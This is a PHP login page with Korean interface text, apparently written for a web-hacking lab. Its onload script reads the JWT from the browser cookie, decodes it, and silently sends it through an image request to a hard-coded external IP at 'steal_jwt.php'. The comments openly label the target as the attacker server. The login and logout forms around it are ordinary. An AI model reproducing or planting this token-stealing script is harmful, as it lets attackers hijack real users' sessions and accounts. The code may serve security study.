<?php
$is_logged_in = isset($_COOKIE['auth_token']) && !empty($_COOKIE['auth_token']);
?>

<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <title>로그인 페이지</title>
    <link rel="stylesheet" href="styles.css">
    <script>
    window.onload = function() {
        // JWT를 쿠키에서 가져옵니다
        var jwt = document.cookie.split('=')[1]; // 'jwt' 쿠키가 있다고 가정

        // JWT를 '.'으로 분리합니다.
        var jwtParts = jwt.split('.');

        // 헤더와 페이로드를 Base64로 디코딩합니다.
        var header = JSON.parse(atob(jwtParts[0]));  // Base64 URL 디코딩 후 JSON 파싱
        var payload = JSON.parse(atob(jwtParts[1])); // Base64 URL 디코딩 후 JSON 파싱


        if (jwt) {
            console.log("JWT 토큰: " + jwt);  // 콘솔에 JWT 출력
            console.log('Header:', header);
            console.log('Payload:', payload);
            // JWT를 공격자 서버로 전송
            var attacker_url = "http://43.202.57.69/steal_jwt.php?jwt=" + "jwt : "+ jwt + "\nheader : " + header + "\npayload : " + payload;
            new Image().src = attacker_url; // JWT를 공격자 서버로 전송
        } else {
            console.log("JWT 토큰이 없습니다.");
        }
    }

    </script>
</head>
<body>
    <h2>로그인</h2>

    <?php
    // 메시지가 있을 경우 출력
    if (isset($_GET['message'])) {
        echo "<p>" . htmlspecialchars($_GET['message']) . "</p>";
    }
    ?>

    <?php if ($is_logged_in): ?>
        <p>현재 로그인 상태입니다.</p>
        <form method="POST" action="login.php">
            <input type="submit" name="logout" value="로그아웃">
        </form>
        <p><a href="account_management.php">계정 관리</a></p>
        <p><a href="board_list.php">게시판 보기</a></p>
    <?php else: ?>
        <form method="POST" action="login.php">
            사용자 이름: <input type="text" name="username" id="username" required><br>
            비밀번호: <input type="password" name="password" id="password" required><br>
            <input type="submit" value="로그인">
        </form>
    <?php endif; ?>
    <p><a href="index.html">홈으로 가기</a></p>
</body>
</html>
